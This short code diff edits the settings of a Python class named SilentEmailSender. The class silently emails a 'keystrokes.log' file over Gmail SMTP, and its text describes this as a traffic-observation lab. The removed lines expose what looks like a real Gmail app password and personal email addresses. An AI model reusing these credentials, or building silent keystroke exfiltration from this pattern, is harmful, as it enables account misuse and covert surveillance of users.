@@ -44,9 +44,9 @@ class SilentEmailSender:
         self.smtp_host = "smtp.gmail.com"
         self.use_starttls = False  # Use SSL by default
         self.smtp_port = DEFAULT_SSL_PORT
-        self.sender = "xinchaonghia@gmail.com"  # Replace with actual sender email
-        self.app_password = "mqdx alcp fkut opuq"  # Replace with actual app password
-        self.recipient = "23162065@student.hcmute.edu.vn"  # Replace with actual recipient email
+        self.sender = "mail-gửi@gmail.com"  # Replace with actual sender email
+        self.app_password = "mật-khẩu"  # Replace with actual app password
+        self.recipient = "mail-nhận@gmail.com"  # Replace with actual recipient email
         self.subject = "Demo gửi keystrokes.log (silent)"
         self.body_text = "Email demo gửi file tự động. Dùng cho bài lab quan sát lưu lượng SMTPS/STARTTLS."
 
